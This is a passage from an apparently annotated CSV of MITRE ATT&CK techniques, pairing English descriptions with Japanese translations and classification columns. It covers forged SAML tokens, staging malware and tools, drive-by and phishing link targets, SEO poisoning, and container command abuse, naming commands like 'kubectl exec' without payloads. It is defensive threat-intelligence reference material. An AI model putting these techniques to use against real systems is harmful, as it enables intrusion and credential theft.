攻撃者は、[秘密鍵](https://attack.mitre.org/techniques/T1552/004) を利用して、組織のトークン署名証明書を侵害し、偽造 SAML トークンを作成する可能性があります。 攻撃者が自身の Active Directory フェデレーション サービス (AD FS) サーバーと新しいフェデレーション信頼関係を確立するのに十分な権限を持っている場合、代わりに独自の信頼されたトークン署名証明書を生成する可能性があります。（引用元：Microsoft SolarWinds Customer Guidance）これは、正当なユーザーから盗まれたり傍受されたりするのではなく、攻撃者によって新たに偽造されたトークンである点で、[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528) やその他の類似の行為とは異なります。 攻撃者は、高権限アカウントを装った偽造SAMLトークンを使用することで、Entra IDの管理者権限を取得する可能性があります。これにより、[代替認証情報の使用](https://attack.mitre.org/techniques/T1550)が発生し、多要素認証やその他の認証保護メカニズムを迂回される恐れがあります。(引用元: Microsoft SolarWinds カスタマーガイダンス),credential-access,SaaS;Windows;IaaS;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;mfa_in_use;identity_federation;privileged_account;user_interaction;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2,2020-12-17T15:24:12.240Z,2025-04-15T23:01:25.698Z,,,,
T1608,,Stage Capabilities,ステージ機能,"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing) Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to): * Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox) * Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) * Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020) * Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",敵対者は、標的選定時に使用可能な能力をアップロード、インストール、またはその他の方法で設定する可能性がある。 敵対者は、作戦を支援するために、自ら開発した機能（[機能の開発](https://attack.mitre.org/techniques/T1587)）または入手した機能（[機能の取得](https://attack.mitre.org/techniques/T1588)）を、自らが管理するインフラストラクチャ上に準備する必要がある場合があります。 これらの機能は、敵対者が以前に購入/レンタルしたインフラストラクチャ（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）または敵対者によって侵害されたインフラストラクチャ（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）上にステージングされる可能性があります。 また、GitHubやPastebinなどのWebサービス、あるいはユーザーがアプリケーションを容易にプロビジョニングできるPlatform-as-a-Service（PaaS）サービス上に展開される場合もある。（引用元：Volexity Ocean Lotus 2020年11月）（引用元：Dragos Heroku Watering Hole）（引用元：Malwarebytes Heroku Skimmers）（引用元：Netskope GCP Redirection）（引用元：Netskope Cloud Phishing）機能のステージングは、攻撃者が初期アクセスや侵害後の行動を遂行する上で、以下のような（ただしこれらに限定されない）支援となる：* ユーザーがサイトにアクセスした際に[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)を実行するために必要なウェブリソースをステージングする。(引用元: FireEye CFR Watering Hole 2012)(引用元: Gallagher 2015)(引用元: ATT ScanBox) * スピアフィッシングで使用するリンク先として、Web リソースをステージングする。（引用元：Malwarebytes Silent Librarian 2020年10月）（引用元：Proofpoint TA407 2019年9月）* 被害者ネットワークからアクセス可能な場所にマルウェアやツールをアップロードし、[侵入ツール転送](https://attack.mitre.org/techniques/T1105)を可能にする。 * 事前に取得したSSL/TLS証明書をインストールし、コマンド＆コントロール通信の暗号化に使用する（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)の組み合わせ）。(引用元: DigiCert Install SSL Cert),resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--84771bc3-f6a0-403e-b144-01af70e5fda0,2021-03-17T20:04:09.331Z,2025-04-15T23:12:21.613Z,,,,
T1608.001,T1608,Upload Malware,マルウェアのアップロード,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server. Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022) Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",攻撃者は標的攻撃時に利用可能とするため、サードパーティまたは攻撃者が制御するインフラにマルウェアをアップロードする可能性がある。悪意のあるソフトウェアにはペイロード、ドロッパー、侵害後ツール、バックドア、その他多様な悪意のあるコンテンツが含まれる。 攻撃者は、インターネット経由でアクセス可能なWebサーバー上に配置することで、[侵入ツール転送](https://attack.mitre.org/techniques/T1105)を可能にするペイロードを被害者ネットワークに提供するなど、作戦を支援するためにマルウェアをアップロードする場合があります。 マルウェアは、攻撃者が事前に購入/レンタルしたインフラストラクチャ（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）や、攻撃者によって侵害されたインフラストラクチャ（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）に配置される場合があります。 マルウェアは、GitHubやPastebinなどのウェブサービス上にステージングされることもあれば、分散型コンテンツストレージにより悪意のあるファイルの削除が困難なInterPlanetary File System（IPFS）上にホストされることもあります。（引用元：Volexity Ocean Lotus 2020年11月）（引用元：Talos IPFS 2022）攻撃者は、アプリケーションバイナリ、仮想マシンイメージ、コンテナイメージなどのバックドア入りファイルを、サードパーティのソフトウェアストアやリポジトリ（例：GitHub、CNET、AWS Community AMI、Docker Hub）にアップロードする場合があります。 被害者は偶然に、[ユーザー実行](https://attack.mitre.org/techniques/T1204) を通じてこれらのバックドア入りファイルを直接ダウンロード/インストールする可能性があります。[偽装](https://attack.mitre.org/techniques/T1036) により、ユーザーが誤ってこれらのファイルを実行する可能性が高まります。,resource-development,PRE,data_exfiltration,unknown,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e,2021-03-17T20:09:13.222Z,2025-04-15T23:17:57.194Z,,,,
T1608.002,T1608,Upload Tool,アップロードツール,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server. Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing) Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",攻撃者は、標的攻撃時に利用可能にするため、サードパーティまたは攻撃者が制御するインフラストラクチャにツールをアップロードする可能性があります。ツールはオープンソースまたはクローズドソース、無料または商用である場合があります。ツールは攻撃者によって悪意のある目的に使用される可能性がありますが、（マルウェアとは異なり）そのような目的で使用されることを意図されていません（例：[PsExec](https://attack.mitre.org/software/S0029)）。 攻撃者は、インターネット経由でアクセス可能なWebサーバー上にツールを配置することで、被害者ネットワークへのツール提供を可能にし、[侵入ツール転送](https://attack.mitre.org/techniques/T1105)を実行するなど、作戦を支援するためにツールをアップロードすることがあります。 ツールは、攻撃者が事前に購入/レンタルしたインフラストラクチャ（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）や、攻撃者によって侵害されたインフラストラクチャ（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）に配置される場合があります。(引用元: Dell TG-3390) ツールは、敵対者が管理する GitHub リポジトリなどのウェブサービスや、ユーザーがアプリケーションを簡単にプロビジョニングできる Platform-as-a-Service サービスにも配置できます。(引用: Dragos Heroku Watering Hole)(引用: Malwarebytes Heroku Skimmers)(引用: Intezer App Service Phishing) 敵対者は、侵害した被害者マシンに、ツールの元のホスティングサイトを含むサードパーティのホスティング場所（例：敵対者が制御していない GitHub リポジトリ）から直接ツールをダウンロードさせることで、ツールをアップロードする必要性を回避することができます。,resource-development,PRE,data_exfiltration,unknown,user_interaction;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--506f6f49-7045-4156-9007-7474cb44ad6d,2021-03-17T20:31:07.828Z,2025-04-15T23:18:15.337Z,,,,
T1608.003,T1608,Install Digital Certificate,デジタル証明書のインストール,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert) Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",攻撃者は標的攻撃時に使用可能なSSL/TLS証明書をインストールする可能性がある。SSL/TLS証明書はシステム間の安全な通信を可能にするサーバーインストール用ファイルである。デジタル証明書には鍵情報、所有者身元情報、証明書内容の正確性を検証した実体のデジタル署名が含まれる。 署名が有効であり、証明書を検証する者が署名者を信頼する場合、その鍵を使用して所有者と安全に通信できることが保証されます。証明書はサーバーにアップロードされ、サーバーは暗号化通信を有効にするためにその証明書を使用するよう設定できます。（引用元: DigiCert Install SSL Cert）攻撃者は、C2通信の暗号化（例: [非対称暗号](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)の組み合わせ)や、認証情報収集サイトの信頼性を装う目的などです。デジタル証明書のインストールは、Webサーバーやメールサーバーを含む様々なサーバータイプで実施されます。 攻撃者はデジタル証明書（[Digital Certificates](https://attack.mitre.org/techniques/T1588/004)参照）を入手するか、自己署名証明書（[Digital Certificates](https://attack.mitre.org/techniques/T1587/003)参照）を作成できる。 その後、デジタル証明書は、敵対者が取得した（[インフラの取得](https://attack.mitre.org/techniques/T1583)）または以前に侵害した（[インフラの侵害](https://attack.mitre.org/techniques/T1584)）可能性のある、敵対者が制御するインフラストラクチャにインストールされる可能性があります。,resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;email_infrastructure;file_storage_access,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069,2021-03-17T20:32:13.793Z,2025-04-15T22:42:10.891Z,,,,
T1608.004,T1608,Drive-by Target,ドライブバイ攻撃対象,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including: * Inserting malicious scripts into web pages or other user controllable web content such as forum posts * Modifying script files served to websites from publicly writeable cloud storage buckets * Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008)) In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox) Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack. Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",攻撃者は、通常のブラウジング中にウェブサイトを訪問するシステムを感染させるための運用環境を準備することがあります。エンドポイントシステムは、[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)のように、攻撃者が制御するサイトへのアクセスを通じて侵害される可能性があります。 このような場合、ユーザーのウェブブラウザが通常は悪用対象となります（サイトにアクセスした後は追加のユーザー操作を必要としない場合が多い）。ただし、攻撃者は[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001)のような非悪用目的のウェブサイトを設定することもあります。 ドライブバイ攻撃（https://attack.mitre.org/techniques/T1189）の前に、攻撃者は、攻撃者が制御するサイトを閲覧するユーザーにそのエクスプロイトを配信するために必要なリソースを準備しなければなりません。 ドライブバイコンテンツは、敵対者が取得した（[インフラの取得](https://attack.mitre.org/techniques/T1583)）または以前に侵害した（[インフラの侵害](https://attack.mitre.org/techniques/T1584)）敵対者管理インフラ上に準備することができます。 攻撃者は、[JavaScript](https://attack.mitre.org/techniques/T1059/007)などの悪意のあるWebコンテンツをWebサイトにアップロードまたは注入することがある。(引用: FireEye CFR Watering Hole 2012)(引用: Gallagher 2015) これには以下のような方法が含まれる: * ウェブページやフォーラム投稿などのユーザー制御可能なコンテンツへの悪意あるスクリプトの挿入* 公開書き込み可能なクラウドストレージバケットからウェブサイトに配信されるスクリプトファイルの改ざん* 悪意あるウェブ広告を作成し、正規の広告プロバイダーを通じてウェブサイト上の広告枠を購入する手法（すなわち[マルバタイジング](https://attack.mitre.org/techniques/T1583/008)） ユーザーのウェブブラウザを悪用するためのコンテンツを準備するだけでなく、攻撃者はユーザーのブラウザをプロファイリングするためのスクリプトコンテンツを準備することもあります（例：[被害ホスト情報の収集](https://attack.mitre.org/techniques/T1592)）。これにより、悪用を試みる前に脆弱性を確認します。（出典：ATT ScanBox）攻撃者に侵害されドライブバイ攻撃の足場として利用されるウェブサイトは、政府機関、特定業界、地域など特定のコミュニティが訪問するサイトである場合がある。この場合、共通の関心事に基づいて特定のユーザーまたはユーザー群を標的とする。この種の標的型キャンペーンは戦略的ウェブ侵害またはウォーターホール攻撃と呼ばれる。 攻撃者は、正当なドメインと類似したドメイン（例：ホモグリフ、タイポスクワッティング、異なるトップレベルドメイン、 など）を購入し、インフラ取得（[Domains](https://attack.mitre.org/techniques/T1583/001)）を通じて[Drive-by Compromise](https://attack.mitre.org/techniques/T1189)を促進する場合がある。,resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,File Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9,2021-03-17T20:33:20.127Z,2025-04-15T22:24:03.854Z,,,,
T1608.005,T1608,Link Target,リンク先ターゲット,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user. Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking) Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)",攻撃者は、標的化時に使用可能なリンクで参照されるリソースを設置する場合がある。攻撃者は、ユーザーが悪意のあるリンクをクリックして情報（認証情報を含む）を漏洩させたり、[悪意のあるリンク](https://attack.mitre.org/techniques/T1204/001)のように実行権限を獲得したりすることを期待する。 リンクは、ソーシャルエンジニアリング文言を伴うメールを送信し、ユーザーにURLを積極的にクリックまたはブラウザにコピー＆ペーストさせるよう誘導する、スピアフィッシングに利用される可能性がある。 情報窃取を目的としたフィッシング（例：[Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)）やシステムへの初期アクセス獲得を目的としたフィッシング（例：[Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)）を実施する前に、 攻撃者はまず、標的型フィッシングリンクのリンク先となるリソースを準備する必要があります。通常、リンク先リソースはHTMLページであり、ユーザーに提供するコンテンツを決定するために[JavaScript](https://attack.mitre.org/techniques/T1059/007)などのクライアントサイドスクリプトを含む場合があります。 攻撃者は正規サイトを複製してリンクターゲットとして利用する場合があり、これには正規ウェブサービスのログインページや組織のログインページを複製し、[スピアフィッシングリンク](https://attack.mitre.org/techniques/T1598/003) を通じて認証情報を収集する試みも含まれる。(引用元: Malwarebytes Silent Librarian 2020年10月)(引用元: Proofpoint TA407 2019年9月) 攻撃者はまた、[マルウェアをアップロード](https://attack.mitre.org/techniques/T1608/001)し、リンク先をユーザーがダウンロード/実行するマルウェアに誘導することもある。攻撃者は、正当なドメインに類似したドメイン（例：ホモグリフ、タイポスクワッティング、異なるトップレベルドメイン、 など）を購入し、インフラ取得時（[ドメイン](https://attack.mitre.org/techniques/T1583/001)）に[悪意のあるリンク](https://attack.mitre.org/techniques/T1204/001)を容易にする場合があります。 攻撃者はURLスキーマを悪用し、フィッシングの効果を高めるため、真の目的先を隠蔽するリンクを作成することがあります。(引用元: Kaspersky-masking)(引用元: mandiant-masking) 攻撃者は、リンク短縮サービスや Platform-as-a-Service プロバイダーの無料または有料アカウントを利用してリンク先をホストし、それらのプロバイダーの広く信頼されているドメインを利用することで、被害者を悪意のあるページにリダイレクトする際にブロックされるのを回避する場合もあります。(引用: Netskope GCP Redirection)(引用: Netskope Cloud Phishing)(引用: Intezer App Service Phishing)(引用: Cofense-redirect) さらに、攻撃者は一意に生成されたURI/URL（ワンタイムリンクや単回使用リンクを含む）を通じて様々な悪意のあるリンクを提供する場合がある。(引用: iOS URL Scheme)(引用: URI)(引用: URI Use)(引用: URI Unique) 最後に、攻撃者は分散型ファイルシステムであるIPFSの特性を悪用し、削除が困難なリンク先をホストする場合がある。(引用: Talos IPFS 2022),resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701,2021-03-17T20:35:08.429Z,2025-04-15T22:45:40.961Z,,,,
T1608.006,T1608,SEO Poisoning,SEOポイズニング,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO) To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO) In addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo) Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader) SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",攻撃者は、検索エンジン最適化（SEO）に影響を与えるメカニズムを汚染し、段階的に展開された機能を潜在的な被害者へ誘導する可能性があります。検索エンジンは通常、購入された広告に加え、ウェブクローラーとアルゴリズムによって算出されたサイトのランキング/スコア/評判に基づいて結果をユーザーに表示します。(引用: Atlas SEO)(引用: MalwareBytes SEO) [ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)を促進するため、攻撃者は悪意のあるペイロードをホストするサイト（例：[ドライブバイ標的](https://attack.mitre.org/techniques/T1608/004)）を検索エンジン内で上位表示させるべく、SEO順位を明示的に操作するコンテンツを仕掛ける可能性がある。 SEOランキングの改ざんには、侵害されたサイトへのキーワード詰め込み（隠しテキスト形式を含む）など様々な手法が用いられる。これらのキーワードは、標的となる被害者の興味・閲覧習慣に関連するもののほか、より広範で季節的に人気の高いトピック（例：選挙、トレンドニュース）に関連する可能性もある。(引用元: ZScaler SEO)(引用元: Atlas SEO) インターネット検索エンジン（Googleなど）に加え、攻撃者は開発者向けプラットフォーム（GitHubなど）の特定サイト内検索を操作し、ユーザーを[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)の罠へ誘導する可能性もある。 サイト内検索は独自のアルゴリズムや人気度などの指標(引用元: Chexmarx-seo)に基づき検索結果をランク付けするため、悪意ある主体による標的化や操作の可能性があります。(引用元: Checkmarx-oss-seo) 敵対者はまた、サイトの算出される関連性や評判を高めるため、仕掛けられた機能への流入リンクを購入または仕込む可能性があります。(引用元: MalwareBytes SEO)(引用元: DFIR Report Gootloader) SEOポイズニングは、防御側の監視を回避しつつSEO入力値を供給するため、回避型リダイレクトやその他のクローキング手法（マウス動作の計測、ブラウザのユーザーエージェント・言語/地域設定・HTTPヘッダーに基づくコンテンツ配信など）と組み合わされる場合がある。(引用元: ZScaler SEO)(引用元: Sophos Gootloader),resource-development,PRE,config_policy_manipulation,unknown,user_interaction,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--e5d550f3-2202-4634-85f2-4a200a1d49b3,2022-09-30T21:14:12.284Z,2025-04-15T23:01:38.651Z,,,,
T1609,,Container Administration Command,コンテナ管理コマンド,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet) In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)",攻撃者はコンテナ管理サービスを悪用し、コンテナ内でコマンドを実行する可能性があります。Dockerデーモン、Kubernetes APIサーバー、kubeletなどのコンテナ管理サービスは、環境内のコンテナをリモート管理することを許可する場合があります。(引用: Docker Daemon CLI)(引用: Kubernetes API)(引用: Kubernetes Kubelet) Dockerでは、攻撃者がコンテナデプロイ時にスクリプトやコマンドを実行するエントリポイント指定を行うか、<code>docker exec</code>などのコマンドを使用して稼働中のコンテナ内でコマンドを実行する可能性があります。(引用: Docker Entrypoint)(引用: Docker Exec) Kubernetes では、攻撃者が十分な権限を持っている場合、Kubernetes API サーバーや kubelet とのやり取り、あるいは <code>kubectl exec</code> などのコマンドの実行によって、クラスタ内のコンテナでリモート実行権限を獲得する可能性があります。(引用: Kubectl Exec Get Shell),execution,Containers,script_command_execution,foothold,endpoint_execution;network_connectivity;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1,2021-03-29T16:39:26.183Z,2025-04-15T19:58:44.024Z,,,,
T1610,,Deploy Container,コンテナのデプロイ,"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020) Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: 